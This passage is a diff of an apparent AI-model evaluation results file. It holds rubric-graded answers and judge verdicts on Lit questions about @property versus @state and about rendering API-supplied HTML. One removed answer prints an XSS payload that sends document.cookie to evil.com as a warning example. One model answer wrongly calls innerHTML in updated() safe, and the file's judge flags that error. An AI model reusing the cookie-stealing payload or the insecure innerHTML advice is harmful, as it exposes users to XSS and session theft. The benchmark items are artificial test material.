-            "name": "identifies @state as internal / no attribute",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "internal",
-            "why": "the key distinction"
+          "skill": {
+            "text": "## `@property()` vs `@state()` in Lit\n\nBoth decorators make a field **reactive** — Lit re-renders when the value changes — but they differ in visibility and how they interact with HTML attributes.\n\n### `@property()` — public API\n\nUse this for data the **outside world sets**, either via HTML attributes or JavaScript.\n\n```typescript\n@customElement('user-card')\nclass UserCard extends LitElement {\n  @property() name = '';\n  @property({ type: Number }) age = 0;\n  @property({ type: Boolean }) disabled = false;\n}\n```\n\nThis gives you:\n- An **HTML attribute** (`<user-card name=\"Alice\">`)\n- A **JavaScript property** (`el.name = 'Alice'`)\n- Automatic string↔type conversion via the `type` option\n\n### `@state()` — private internal state\n\nUse this for data that **only the component itself manages**. It triggers re-renders but creates no attribute and signals to consumers that the field is an implementation detail.\n\n```typescript\n@customElement('toggle-button')\nclass ToggleButton extends LitElement {\n  @property() label = 'Click me';  // public: callers set this\n\n  @state() private _isOpen = false; // private: component manages this\n  @state() private _count = 0;\n\n  render() {\n    return html`\n      <button @click=${this._handleClick}>\n        ${this.label} (${this._count})\n      </button>\n    `;\n  }\n\n  private _handleClick() {\n    this._isOpen = !this._isOpen;\n    this._count++;\n  }\n}\n```\n\n`@state()` is essentially shorthand for `@property({ state: true, attribute: false })`.\n\n---\n\n### Decision guide\n\n| Question | Answer | Use |\n|---|---|---|\n| Should a parent component or HTML author set this? | Yes | `@property()` |\n| Should it be settable as an HTML attribute? | Yes | `@property()` |\n| Is it purely internal (UI state, derived data, flags)? | Yes | `@state()` |\n| Should it appear in the element's public TypeScript API? | No | `@state()` |\n\n---\n\n### Common examples\n\n```typescript\nclass SearchBox extends LitElement {\n  // Public API — callers provide these\n  @property() placeholder = 'Search…';\n  @property({ type: Number }) maxResults = 10;\n\n  // Internal state — component owns these\n  @state() private _query = '';\n  @state() private _isLoading = false;\n  @state() private _results: Result[] = [];\n\n  render() {\n    return html`\n      <input\n        .value=${this._query}\n        @input=${(e: InputEvent) =>\n          this._query = (e.target as HTMLInputElement).value}\n        placeholder=${this.placeholder}\n      />\n      ${this._isLoading ? html`<span>Loading…</span>` : nothing}\n    `;\n  }\n}\n```\n\n---\n\n### The mutation rule (applies to both)\n\nLit detects changes by **reference equality** (`!==`). Mutating an object or array in place won't trigger a re-render:\n\n```typescript\n// ❌ No re-render — same array reference\nthis._results.push(newItem);\n\n// ✅ New reference — re-render triggered\nthis._results = [...this._results, newItem];\n```\n\n---\n\n**Short version:** `@property()` is your component's public interface; `@state()` is its private memory. When in doubt, start with `@state()` and promote to `@property()` only if an external caller needs to set it.",
+            "cost_usd": 0.024666,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "triggers re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions reactive trigger / re-render",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "Triggers a re-render",
-            "why": "both are reactive — the difference is exposure, not reactivity"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers cover all three rubric criteria well, but Answer A provides more concrete, realistic examples (SearchBox with multiple properties and states) and includes the important mutation/reference equality rule that helps developers avoid common pitfalls. Answer A's decision table and richer code examples make it more practically useful, though Answer B is also solid and slightly more concise.",
+            "per_criterion": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "better": "tie"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "better": "tie"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "judge": {
-        "winner": "skill",
-        "reasoning": "Both answers are excellent and cover all three rubric criteria well. Answer B edges out A by including a practical 'common gotcha' section about mutation vs. reassignment, which adds concrete, actionable value beyond the core distinction. Both answers are equally clear on @property as public/attribute-synced, @state as internal/no-attribute, and reactive re-rendering, but B's additional tip makes it more useful for real-world usage.",
-        "per_criterion": [
-          {
-            "name": "identifies @property as public API / attribute-synced",
-            "better": "tie"
+        },
+        "opus": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# `@property()` vs `@state()` in Lit\n\nThe core distinction is **public API vs. internal state**.\n\n## `@property()` — Public, reactive API\n\nUse this when the value should be settable from **outside** the component, typically as an HTML attribute or DOM property.\n\n```ts\n@property({ type: String })\nname = 'world';\n```\n\n- Creates a corresponding **HTML attribute** (e.g., `<my-el name=\"Alice\">`)\n- Part of your component's public contract\n- Triggers re-render on change\n- Supports type conversion, attribute name customization, etc.\n\n## `@state()` — Private, reactive internal state\n\nUse this for values that are **internal** to the component and shouldn't be set by consumers.\n\n```ts\n@state()\nprivate _isOpen = false;\n```\n\n- **No** corresponding HTML attribute\n- Not part of the public API (often paired with `private`)\n- Still triggers re-render on change\n- Excluded from tooling that introspects public properties\n\n## Quick decision guide\n\n| Question | Use |\n|---|---|\n| Should a parent set this via attribute or property? | `@property()` |\n| Is this derived from user interaction or async work inside the component? | `@state()` |\n| Does it need to be reflected to/from an attribute? | `@property()` |\n| Is it implementation detail that could change without breaking consumers? | `@state()` |\n\n## Common example\n\n```ts\n@customElement('user-card')\nclass UserCard extends LitElement {\n  // Public input — caller provides this\n  @property() userId = '';\n\n  // Internal — fetched data, not for callers to set\n  @state() private _user?: User;\n  @state() private _loading = false;\n\n  async updated(changed: PropertyValues) {\n    if (changed.has('userId')) {\n      this._loading = true;\n      this._user = await fetchUser(this.userId);\n      this._loading = false;\n    }\n  }\n}\n```\n\n**Rule of thumb:** if you'd document it in your component's README, it's `@property()`. If it's an implementation detail, it's `@state()`.",
+            "cost_usd": 0.05061,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "Triggers re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "identifies @state as internal / no attribute",
-            "better": "tie"
+          "skill": {
+            "text": "Great question — the distinction is about **API surface**, not behavior. Both trigger re-renders the same way; they differ in whether the field is part of your component's public contract.\n\n## `@property()` — public input\n\nUse when the field is part of how external code (HTML, parents, frameworks) configures your component:\n\n- **Reflected to/from an HTML attribute** by default, so it can be set in markup: `<user-card name=\"Ada\">`\n- **Documented as part of your component's API**\n- Type-converted from the attribute string (string, number, boolean, object via JSON)\n\n```ts\n@customElement('user-card')\nexport class UserCard extends LitElement {\n  @property() name = '';\n  @property({ type: Number }) age = 0;\n  @property({ type: Boolean }) active = false;\n}\n```\n\n## `@state()` — private internal state\n\nUse when the field drives rendering but is an implementation detail:\n\n- **Not associated with an attribute** — can't be set from HTML\n- **Not part of the public API** — safe to rename/remove without breaking consumers\n- Triggers re-renders identically to `@property`\n\n```ts\n@customElement('user-card')\nexport class UserCard extends LitElement {\n  @property() userId = '';\n\n  // Internal: fetched data, UI mode, hover state, etc.\n  @state() private _expanded = false;\n  @state() private _loadedUser: User | null = null;\n}\n```\n\n## Quick decision rule\n\nAsk: *\"Should someone be able to set this from HTML or from a parent component?\"*\n\n- **Yes** → `@property()`\n- **No, it's internal bookkeeping** → `@state()`\n\n## Common cases\n\n| Field | Decorator |\n|---|---|\n| `name`, `value`, `disabled`, `placeholder` | `@property()` |\n| `_isOpen`, `_hoverIndex`, `_fetchedData` | `@state()` |\n| Result of a `Task` you store on the instance | `@state()` |\n| Anything prefixed with `_` (convention for private) | usually `@state()` |\n\n## One subtle gotcha\n\nDon't use `@property()` for objects you don't want serialized to attributes. If you have a complex object input from a parent, use `@property({ attribute: false })` — that keeps it as a public reactive input but disables the attribute machinery. It's the right choice for context providers/consumers and for object/array props that only ever come from JS, not HTML.\n\n```ts\n@property({ attribute: false }) user!: User;  // public, JS-only\n```\n\nSo the full hierarchy is:\n1. `@property()` — public, attribute-bindable\n2. `@property({ attribute: false })` — public, JS-only\n3. `@state()` — private, internal",
+            "cost_usd": 0.14567999999999998,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "trigger re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions reactive trigger / re-render",
-            "better": "tie"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers are excellent and cover all three rubric criteria well. Answer A edges out B by providing the additional nuance of `@property({ attribute: false })` as a middle ground between fully public attribute-synced properties and fully private state, which is genuinely useful and often overlooked. Answer A also provides a more comprehensive comparison table and the 'full hierarchy' framing adds clarity. Answer B is slightly more concise and has a clean example, but A's extra depth on the attribute:false option makes it more complete.",
+            "per_criterion": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "better": "tie"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "better": "tie"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "better": "tie"
+              }
+            ]
           }
-        ]
+        }
       }
     },
     {
       "id": "simplest-render-html",
       "prompt": "Inside my Lit component's render() method, I want to insert some\nuser-controlled HTML I just received from an API as a string.\nWhat's the simplest way to render it?\n",
       "expectation": "skill_wins_strict",
-      "expectation_met": true,
-      "baseline": {
-        "text": "# Rendering raw HTML in Lit\n\nLit deliberately escapes any string you interpolate into an `html` template, so this won't work:\n\n```js\nrender() {\n  return html`<div>${this.apiHtml}</div>`; // renders as escaped text\n}\n```\n\nTo inject HTML as actual markup, use the built-in **`unsafeHTML`** directive:\n\n```js\nimport { LitElement, html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nclass MyEl extends LitElement {\n  static properties = { apiHtml: { type: String } };\n\n  render() {\n    return html`<div>${unsafeHTML(this.apiHtml)}</div>`;\n  }\n}\n```\n\n## ⚠️ But please don't do this with user-controlled HTML\n\nThe directive is named `unsafeHTML` for a reason — passing untrusted strings straight in is a textbook XSS vulnerability. A payload like `<img src=x onerror=\"...\">` will execute in your component's shadow root.\n\nThe simplest *safe* version is to sanitize first, e.g. with [DOMPurify](https://github.com/cure53/DOMPurify):\n\n```js\nimport DOMPurify from 'dompurify';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nrender() {\n  const clean = DOMPurify.sanitize(this.apiHtml);\n  return html`<div>${unsafeHTML(clean)}</div>`;\n}\n```\n\nA few alternatives worth considering depending on your use case:\n\n- **If it's really just text**, drop `unsafeHTML` entirely — `${this.apiHtml}` is already safe.\n- **If it's Markdown**, render it via a markdown library that outputs sanitized HTML (e.g. `marked` + DOMPurify, or `markdown-it` with HTML disabled).\n- **If you need strong isolation**, render it inside a sandboxed `<iframe sandbox>` so scripts can't touch your page.\n\nShort answer: `unsafeHTML(...)` from `lit/directives/unsafe-html.js` — wrapped around a sanitizer.",
-        "cost_usd": 0.0376685,
-        "rubric": [
-          {
-            "name": "warns about XSS / sanitization",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "XSS",
-            "why": "must call out the security implication"
+      "judge_focus": "The naive answer reaches for innerHTML or unsafeHTML. The right\nanswer either uses the unsafeHTML directive WITH a strong warning\nabout XSS and sanitization, or refuses the bare string injection\nand recommends parsing into a structured form first. innerHTML\ninside Lit defeats the templating system entirely.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": false,
+          "baseline": {
+            "text": "# Rendering User-Controlled HTML in Lit\n\nThe simplest way is to use the **`unsafeHTML`** directive:\n\n```javascript\nimport { LitElement, html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nclass MyComponent extends LitElement {\n  render() {\n    return html`\n      <div>${unsafeHTML(this.apiContent)}</div>\n    `;\n  }\n}\n```\n\n## ⚠️ Important Security Warning\n\nThe name `unsafeHTML` is intentional—it's **unsafe** because it bypasses Lit's built-in XSS protection. Only use this if:\n\n1. **You trust the source completely** (e.g., your own backend)\n2. **You've sanitized the HTML** on the server side\n\n## Safer Alternative: Sanitize First\n\nIf the HTML comes from untrusted sources, sanitize it before rendering:\n\n```javascript\nimport DOMPurify from 'dompurify';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nrender() {\n  const cleanHTML = DOMPurify.sanitize(this.apiContent);\n  return html`<div>${unsafeHTML(cleanHTML)}</div>`;\n}\n```\n\n## Best Practice\n\nIf possible, **avoid rendering raw HTML entirely**:\n- Parse the API response into structured data\n- Use Lit templates to render components instead\n- This is safer and more maintainable\n\nOnly use `unsafeHTML` when you have a legitimate need for dynamic HTML and can guarantee its safety.",
+            "cost_usd": 0.001983,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "avoids recommending raw innerHTML",
-            "kind": "must_not_contain",
-            "passed": true,
-            "evidence": null,
-            "why": "innerHTML is the trap; should not be the answer"
+          "skill": {
+            "text": "# Rendering User-Controlled HTML in Lit\n\n**Do not use `unsafeHTML()`** for user-controlled content. It creates an XSS vulnerability.\n\n## The Safe Approach: Use a `<div>` with `innerHTML`\n\nThe simplest safe way is to render an empty container and set its `innerHTML` after the element updates:\n\n```typescript\nimport { LitElement, html } from 'lit';\nimport { customElement, property } from 'lit/decorators.js';\n\n@customElement('my-component')\nexport class MyComponent extends LitElement {\n  @property() userContent = '';\n\n  render() {\n    return html`<div id=\"content\"></div>`;\n  }\n\n  updated() {\n    const container = this.shadowRoot?.querySelector('#content');\n    if (container) {\n      container.innerHTML = this.userContent;\n    }\n  }\n}\n```\n\n**Why this works:**\n- `innerHTML` is safe when you control the assignment (not user input directly in the template)\n- `updated()` runs after the DOM is rendered, so the element exists\n- The `<div>` is in Shadow DOM, so styles and scripts in the HTML won't leak out\n\n## If You Must Sanitize First\n\nIf the API content might contain malicious scripts, sanitize it before setting `innerHTML`:\n\n```typescript\nimport DOMPurify from 'dompurify';\n\nupdated() {\n  const container = this.shadowRoot?.querySelector('#content');\n  if (container) {\n    container.innerHTML = DOMPurify.sanitize(this.userContent);\n  }\n}\n```\n\nInstall: `npm i dompurify`\n\n## Why Not `unsafeHTML()`?\n\n```typescript\n// ❌ NEVER do this with user content\nrender() {\n  return html`${unsafeHTML(this.userContent)}`;\n}\n```\n\n`unsafeHTML()` bypasses Lit's escaping entirely. If `userContent` contains `<img src=x onerror=\"alert('hacked')\">`, it will execute.\n\n## Summary\n\n| Approach | Use When | Security |\n|----------|----------|----------|\n| `innerHTML` in `updated()` | Content is from your own API | Safe if you trust the source |\n| `innerHTML` + `DOMPurify` | Content is from untrusted sources | Safe; removes scripts/dangerous attrs |\n| `unsafeHTML()` | Never with user content | ❌ XSS risk |\n\n**Recommendation:** Use `innerHTML` in `updated()` + `DOMPurify` if there's any doubt about the source.",
+            "cost_usd": 0.0069169999999999995,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions unsafeHTML directive (if recommending it)",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "unsafeHTML",
-            "why": "the Lit-specific escape hatch (with caveats)"
+          "judge": {
+            "winner": "baseline",
+            "reasoning": "Answer A correctly recommends the `unsafeHTML` directive (the idiomatic Lit approach) with strong XSS warnings and a DOMPurify sanitization example, while also suggesting structured data as the best practice. Answer B incorrectly steers users away from `unsafeHTML` toward raw `innerHTML` in `updated()`, which actually defeats Lit's templating system and is the anti-pattern the rubric explicitly warns against — Shadow DOM does NOT prevent script execution from innerHTML, making B's 'Why this works' explanation factually wrong.",
+            "per_criterion": [
+              {
+                "name": "warns about XSS / sanitization",
+                "better": "baseline"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "better": "baseline"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "better": "baseline"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "skill": {
-        "text": "# Rendering HTML strings in Lit\n\nThe direct answer is Lit's `unsafeHTML` directive:\n\n```js\nimport { html, LitElement } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nclass MyEl extends LitElement {\n  render() {\n    return html`<div>${unsafeHTML(this.apiHtml)}</div>`;\n  }\n}\n```\n\nBy default, Lit treats interpolated strings as text content (escaping them), so `${this.apiHtml}` would render the markup as visible text rather than parsing it. `unsafeHTML` parses the string as HTML and inserts the resulting nodes.\n\n## ⚠️ But please don't do this with user-controlled HTML\n\nThe directive is named `unsafeHTML` for a reason — it's an XSS sink. If the string contains anything like:\n\n```html\n<img src=x onerror=\"fetch('https://evil.com/?c=' + document.cookie)\">\n<script>...</script>\n<a href=\"javascript:...\">click</a>\n```\n\n…it will execute in your app's origin. Lit's Shadow DOM does **not** protect you here; Shadow DOM is an encapsulation boundary, not a security boundary. Scripts inside a shadow root run with full access to the page.\n\n### Safer alternatives\n\n1. **Sanitize first.** Run the HTML through [DOMPurify](https://github.com/cure53/DOMPurify) before handing it to `unsafeHTML`:\n   ```js\n   import DOMPurify from 'dompurify';\n   // ...\n   return html`<div>${unsafeHTML(DOMPurify.sanitize(this.apiHtml))}</div>`;\n   ```\n   Configure the allow-list to be as narrow as your use case permits.\n\n2. **Render structured data instead of HTML.** If you control the API, return JSON describing the content and build the template with normal Lit interpolation — no sanitization needed.\n\n3. **Use a sandboxed `<iframe srcdoc>`** with a restrictive `sandbox` attribute (e.g. `sandbox=\"\"` to disable scripts) if you need to display arbitrary third-party HTML in isolation.\n\n4. **Trusted Types.** If you're deploying with a `require-trusted-types-for 'script'` CSP, you'll need to produce a `TrustedHTML` value (typically via DOMPurify's `RETURN_TRUSTED_TYPE` option) before `unsafeHTML` will accept it — a good belt-and-braces signal that sanitization happened.\n\nSo: `unsafeHTML` is the simplest mechanism, but pair it with sanitization (or pick a safer approach) whenever the string originated outside your own code.",
-        "cost_usd": 0.04067350000000001,
-        "rubric": [
-          {
-            "name": "warns about XSS / sanitization",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "XSS",
-            "why": "must call out the security implication"
+        },
+        "sonnet": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "## Rendering Raw HTML in Lit\n\nIn Lit, you can use the **`unsafeHTML`** directive from `lit/directives/unsafe-html.js` to render a raw HTML string.\n\n### Example\n\n```javascript\nimport { LitElement, html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nclass MyElement extends LitElement {\n  static properties = {\n    apiContent: { type: String },\n  };\n\n  constructor() {\n    super();\n    this.apiContent = '<p>Hello from the <strong>API</strong>!</p>';\n  }\n\n  render() {\n    return html`\n      <div>\n        ${unsafeHTML(this.apiContent)}\n      </div>\n    `;\n  }\n}\n\ncustomElements.define('my-element', MyElement);\n```\n\n---\n\n### ⚠️ Security Warning\n\nThe directive is called **`unsafe`** HTML for a reason. Since the content comes from a user-controlled API, you **must sanitize it first** to prevent **XSS attacks**. Use a library like [DOMPurify](https://github.com/cure53/DOMPurify) before passing it to the directive:\n\n```javascript\nimport DOMPurify from 'dompurify';\n\nrender() {\n  const sanitized = DOMPurify.sanitize(this.apiContent);\n  return html`\n    <div>\n      ${unsafeHTML(sanitized)}\n    </div>\n  `;\n}\n```\n\n---\n\n### Why not just use `innerHTML`?\n\nLit's `html` template tag **escapes strings by default** to prevent XSS, so dropping a raw string into a template won't work — `unsafeHTML` is the intended escape hatch for this use case.",
+            "cost_usd": 0.006714,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "avoids recommending raw innerHTML",
-            "kind": "must_not_contain",
-            "passed": true,
-            "evidence": null,
-            "why": "innerHTML is the trap; should not be the answer"
+          "skill": {
+            "text": "## Rendering Raw HTML in Lit\n\nUse the `unsafeHTML` directive from `lit/directives/unsafe-html.js`:\n\n```typescript\nimport { LitElement, html } from 'lit';\nimport { customElement, state } from 'lit/decorators.js';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\n@customElement('my-article')\nexport class MyArticle extends LitElement {\n  @state() private _content = '';\n\n  render() {\n    return html`\n      <div class=\"content\">\n        ${unsafeHTML(this._content)}\n      </div>\n    `;\n  }\n}\n```\n\nThe name `unsafeHTML` is intentional — Lit's `html` template tag escapes interpolated strings by design to prevent XSS. This directive bypasses that protection entirely.\n\n## ⚠️ Security Warning\n\n**Never use `unsafeHTML` with user-controlled content without sanitizing it first.** An attacker can inject `<script>` tags, event handlers (`onerror`, `onload`), and other malicious markup.\n\nSanitize on the server before the API returns the content, or sanitize on the client using a library like [DOMPurify](https://github.com/cure53/DOMPurify):\n\n```typescript\nimport DOMPurify from 'dompurify';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nrender() {\n  const clean = DOMPurify.sanitize(this._content);\n  return html`<div>${unsafeHTML(clean)}</div>`;\n}\n```\n\n## When `unsafeHTML` Is Appropriate\n\n| Content source | Safe to use `unsafeHTML`? |\n|---|---|\n| Your own CMS / trusted backend | ✅ Yes, but still consider sanitizing |\n| Third-party API you don't control | ⚠️ Only after sanitizing |\n| User-submitted content | ❌ Never without sanitizing |\n| Static strings in your own code | ✅ Yes |\n\nIf the API returns Markdown instead of HTML, convert it with a library (e.g. `marked`) and then sanitize the resulting HTML before passing it to `unsafeHTML`.",
+            "cost_usd": 0.019719,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions unsafeHTML directive (if recommending it)",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "unsafeHTML",
-            "why": "the Lit-specific escape hatch (with caveats)"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly recommend unsafeHTML with XSS warnings and DOMPurify sanitization, but Answer B goes further with a practical trust-level table that helps developers make informed decisions, mentions server-side sanitization as an option, and includes a note about Markdown-to-HTML conversion. Answer B also avoids the slightly misleading claim in A that 'dropping a raw string into a template won't work' (it works, it just gets escaped), and provides more complete guidance overall.",
+            "per_criterion": [
+              {
+                "name": "warns about XSS / sanitization",
+                "better": "skill"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "better": "tie"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "judge": {
-        "winner": "skill",
-        "reasoning": "Both answers correctly identify unsafeHTML and warn about XSS, but Answer B provides more depth and accuracy. Notably, B explicitly clarifies that Shadow DOM is NOT a security boundary (a common misconception), mentions Trusted Types as an additional defense layer, and provides more concrete XSS payload examples. Both avoid recommending raw innerHTML and both mention unsafeHTML with appropriate warnings, but B's additional nuance around Shadow DOM security and Trusted Types makes it more complete and accurate.",
-        "per_criterion": [
-          {
-            "name": "warns about XSS / sanitization",
-            "better": "skill"
+        },
+        "opus": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# Rendering User-Controlled HTML in Lit\n\n**Short answer:** Use Lit's `unsafeHTML` directive — but be very careful, because the name is a literal warning.\n\n```js\nimport { LitElement, html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nclass MyElement extends LitElement {\n  static properties = { apiHtml: { type: String } };\n\n  render() {\n    return html`<div>${unsafeHTML(this.apiHtml)}</div>`;\n  }\n}\ncustomElements.define('my-element', MyElement);\n```\n\nBy default, Lit escapes interpolated strings to prevent XSS. `unsafeHTML` bypasses that escaping and parses the string as HTML.\n\n## ⚠️ Security warning\n\nYou said the HTML is **user-controlled** and comes from an API. That's exactly the scenario where `unsafeHTML` is dangerous: a malicious user could inject `<script>` tags, `<img onerror=...>`, or other XSS payloads.\n\n**You should sanitize it first.** The standard choice is [DOMPurify](https://github.com/cure53/DOMPurify):\n\n```js\nimport { html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\nimport DOMPurify from 'dompurify';\n\nrender() {\n  const clean = DOMPurify.sanitize(this.apiHtml);\n  return html`<div>${unsafeHTML(clean)}</div>`;\n}\n```\n\n## Note on Shadow DOM\n\nIf your component uses Shadow DOM (the Lit default), the injected HTML is somewhat isolated from the rest of the page's styles and scripts — but this is **not** a security boundary. Inline event handlers and `<script>` still execute in the same JS realm. Always sanitize.",
+            "cost_usd": 0.04704,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "avoids recommending raw innerHTML",
-            "better": "tie"
+          "skill": {
+            "text": "# Don't render user-controlled HTML strings — this is an XSS vulnerability\n\nBefore I answer the \"how,\" I have to flag the security issue: **rendering user-controlled HTML from an API directly into your DOM is a cross-site scripting (XSS) vulnerability.** An attacker can inject `<script>` tags, `<img onerror=...>` handlers, event handlers, `<iframe>` elements, etc., that run with your site's privileges (steal cookies, session tokens, make authenticated requests, etc.).\n\nLit deliberately makes this hard. By design, Lit's `html` template tag escapes all interpolated string values:\n\n```ts\nrender() {\n  // This is SAFE — the string is rendered as text, tags are escaped\n  return html`<div>${this.apiHtml}</div>`;\n}\n```\n\nIf `apiHtml` is `<script>alert(1)</script>`, the user sees the literal text, not an executed script. **In the vast majority of cases, this is what you want.** Ask yourself first: do you actually need HTML, or do you just need text? If text, you're already done.\n\n## If you genuinely need to render HTML\n\nYou have two options, in order of preference:\n\n### 1. Sanitize first, then use `unsafeHTML` (the right choice for user content)\n\nUse a vetted sanitizer like [DOMPurify](https://github.com/cure53/DOMPurify) to strip dangerous content, then render with the `unsafeHTML` directive:\n\n```ts\nimport { html } from 'lit';\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\nimport DOMPurify from 'dompurify';\n\nrender() {\n  const clean = DOMPurify.sanitize(this.apiHtml);\n  return html`<div>${unsafeHTML(clean)}</div>`;\n}\n```\n\nDOMPurify removes scripts, event handlers, `javascript:` URLs, and other vectors while preserving safe markup like `<p>`, `<strong>`, `<a href>`, etc. You can configure allowed tags/attributes if you want to be stricter.\n\n### 2. `unsafeHTML` alone (only for HTML you fully trust and control)\n\n```ts\nimport { unsafeHTML } from 'lit/directives/unsafe-html.js';\n\nrender() {\n  return html`<div>${unsafeHTML(this.trustedHtml)}</div>`;\n}\n```\n\nThe directive is named `unsafeHTML` precisely because it bypasses Lit's escaping. **Only use it without sanitization if the HTML originates from a source you control end-to-end** (e.g., your own CMS where authors are trusted, server-rendered markup you generated yourself). API responses generally do not qualify, even from your own backend, 